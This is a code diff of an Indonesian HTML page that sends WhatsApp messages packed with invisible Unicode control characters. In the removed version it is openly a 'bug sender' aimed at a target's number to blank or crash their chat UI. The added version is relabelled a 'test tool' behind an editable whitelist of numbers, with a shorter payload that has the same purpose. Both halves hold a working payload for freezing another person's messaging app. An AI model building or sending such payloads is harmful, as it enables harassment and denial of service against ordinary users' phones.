@@ -2,21 +2,18 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8">
-  <title>WhatsApp Bug Sender - All Blank UI</title>
+  <title>Unicode Bug WhatsApp - Test Tool</title>
   <style>
     body {
       font-family: Arial, sans-serif;
-      background: #f5f5f5;
-      padding: 50px;
       text-align: center;
-    }
-    h1 {
-      color: #25D366;
+      padding: 50px;
+      background-color: #f0f0f0;
     }
     input {
-      width: 300px;
       padding: 12px;
       font-size: 16px;
+      width: 280px;
       border: 1px solid #ccc;
       border-radius: 6px;
       margin-bottom: 20px;
@@ -25,9 +22,9 @@
       padding: 12px 24px;
       background-color: #25D366;
       color: white;
+      font-size: 16px;
       border: none;
       border-radius: 6px;
-      font-size: 16px;
       cursor: pointer;
     }
     button:hover {
@@ -36,27 +33,27 @@
   </style>
 </head>
 <body>
-  <h1>💀 Kirim Bug WhatsApp - Blank Crash</h1>
-  <p>Masukkan nomor target (format 62...):</p>
+  <h1>🧪 Unicode Bug WhatsApp Test Tool</h1>
+  <p>Masukkan nomor WhatsApp kamu sendiri:</p>
   <input type="text" id="nomor" placeholder="Contoh: 6281234567890"><br>
-  <button onclick="kirimBug()">🚨 Kirim Sekarang</button>
+  <button onclick="kirim()">Kirim Uji Coba</button>
 
   <script>
-    // Payload bug blank UI delay permanen (invisible chars)
-    const bugBlank = (
-      "\u2063\u200f\u202e\u202a\u202d\u202b\u200b\u200c\u200d\u2060\u2061\u2062\u2064\u061C\uFEFF\u00AD"
-    ).repeat(9999999999999999); // Lebih dari 600.000 karakter invisible
+    const whitelist = ["6281234567890", "6289876543210"]; // ← masukkan nomor kamu sendiri
 
-    function kirimBug() {
+    const bug = (
+      "\u200F\u200E\u202E\u202A\u202D\u202B\u200B\u200C\u200D\u2063\u2060\uFEFF\u061C\u00AD"
+    ).repeat(4000); // ~60.000 invisible chars (UI delay bug)
+
+    function kirim() {
       const nomor = document.getElementById("nomor").value.trim();
-      if (!nomor || !nomor.startsWith("62")) {
-        alert("❌ Nomor tidak valid. Harus diawali dengan 62.");
+      if (!whitelist.includes(nomor)) {
+        alert("Nomor tidak diizinkan (whitelist). Edit dulu jika ingin menambahkan.");
         return;
       }
 
-      const pesan = encodeURIComponent(bugBlank);
-      const url = `https://wa.me/${nomor}?text=${pesan}`;
-      window.open(url, "_blank");
+      const waLink = `https://wa.me/${nomor}?text=${encodeURIComponent(bug)}`;
+      window.location.href = waLink;
     }
   </script>
 </body>
